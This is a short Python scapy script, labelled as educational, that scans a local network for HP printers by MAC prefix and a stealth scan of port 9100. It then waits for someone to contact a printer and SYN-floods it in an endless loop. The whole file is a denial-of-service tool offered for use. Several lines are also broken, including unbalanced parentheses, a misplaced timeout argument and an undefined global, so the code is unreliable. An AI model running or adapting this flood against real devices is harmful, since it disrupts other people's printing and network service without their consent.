#!/usr/bin/python3
#this script is for educational purposes only!
#made by asher-epstein-42
from scapy.all import *

RAW_PRINTING_PORT = 9100 #this port is used for raw printing
 
def main():
	your_network_ip_range = str(input("What is your ip range? ")
	#scan the network to create a list of hp printers
	list_of_hp_printers = arp_scan(your_network_ip_range)
				    
	#wait for arp request to a hp printer
	hp_printer_ip = wait_for_connection_attempt()
				    
	#start dos attack (SYN Flooding Attack) on the printer
	dos_syn_flooding_attack(hp_printer_ip)

				    
def arp_scan(ip_range):
	list_of_printers =[]
	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(ip_range), timeout=2)
	for sent, recived in ans:
		if recived[ARP].hwsrc[0:8] == "9c:7b:ef": #Hewlett Packard(HP) mac address
			if stealth_scan(recived[ARP].psrc,RAW_PRINTING_PORT) == True:
				list_of_printers.append(recived[ARP].psrc)
	return list_of_printers
						

			
#function to filter frames by the first half of the destination mac address(that determine that this is an hp #device -> 9C:7B:EF) and  if arp opcode == 1 (to check if this is a arp request to one of the printers)
def filter_hp_printer(frame):
	return ARP in frame and frame[ARP].op ==1 and frame[ARP].pdst in list_of_hp_printers
	
def wait_for_connection_attempt():
	frames = sniff(count = 1, lfilter = filter_hp_printer)
	return frames[0][ARP].pdst #ip address of the hp device


def stealth_scan(hp_device_ip,hp_device_port):
#preferm stealth scan on port 9100 to see if this is a printer (9100 used for raw printing)
	stealth_scan_hp = sr1(IP(dst=hp_device_ip)/TCP(dport=hp_device_port,flags='S'),timeout=10)
	if(stealth_scan_hp.getlayer(TCP).flags == 0x12): #0x12 -> syn ack -> the port is open
		#send reset to complete the scan
        	send_rst = sr(IP(dst=hp_device_ip)/TCP(dport=hp_device_port,flags='R'),timeout=10)
        	return True
        return False
       
def dos_syn_flooding_attack(dst_ip):
	hp_ip = IP(dst=dst_ip)
        #set src address to a random IP address in the private network range 
        hp_tcp = TCP(sport=RandShort(), dport=80, flags="S")
        hp_raw = Raw(b"X" * 10000) 
        dos_packet = hp_ip / hp_tcp / hp_raw
        send(dos_packet,loop=1, verbose=0)
	
	
if __name__ == "__main__":
    main()





#The porpose of this script is to check if someone is trying to connect to a HP printer over the network,
#and in case of detection -> perform a dos(denial of service) attack on the hp printer
#first we are scanning the network for hp devices by their mac address(mac address of hp devices starts with #9C:7B:EF), but we cant determine the type of the device this way, so we are checking if the raw
#printing port(9100) is open -> there for this is a hp printer (because it uses raw printing protocol)  
#for every hp device we check if this is a printer by performing a stealth scan using our capturd destination IP address and port 9100 (raw ptinting) over tcp to see if we manage to get any response
# if it is a hp printer, were going to send a reset and start a dos attack(SYN Flooding Attack ).	
